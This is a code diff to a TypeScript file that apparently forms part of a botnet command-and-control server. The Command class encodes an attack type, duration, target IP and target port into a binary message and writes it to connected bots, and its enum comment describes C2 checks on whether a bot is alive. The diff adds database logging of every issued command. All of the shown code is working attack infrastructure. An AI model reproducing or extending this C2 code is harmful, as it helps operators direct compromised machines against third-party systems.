@@ -1,5 +1,6 @@
 import net from 'net';
 import { SocketManager } from './clients';
+import { Database } from './database';
 
 export enum CommandType {
     PING = 1 << 0,  // C2 check if bot is alive
@@ -28,6 +29,11 @@ export class Command {
         this.socket = socket;
     }
 
+    public static async getAllCommands() {
+        return await Database.db.get('commands') || []
+
+    }
+
     public build(): Buffer {
         const parsedIp = this.targetIp.split('.').map(Number);
         if (parsedIp.length !== 4 || parsedIp.some(isNaN)) {
@@ -37,6 +43,10 @@ export class Command {
         //Split the port in 2 different bytes
         const portHigh = (this.port >> 8) & 0xFF;
         const portLow = this.port & 0xFF;
+
+        (async () => {
+            await Database.db.push('commands', `Type: ${this.type}\nDuration: ${this.duration}\nTargetIp: ${this.targetIp}\nTargetPort: ${this.port}`)
+        })()
 
         return Buffer.from(new Uint8Array([
             this.type,
@@ -50,7 +60,7 @@ export class Command {
 
     public send(): boolean {
 
-        if(this.socket) 
+        if (this.socket)
             return this.socket.write(this.build());
 
         return false;
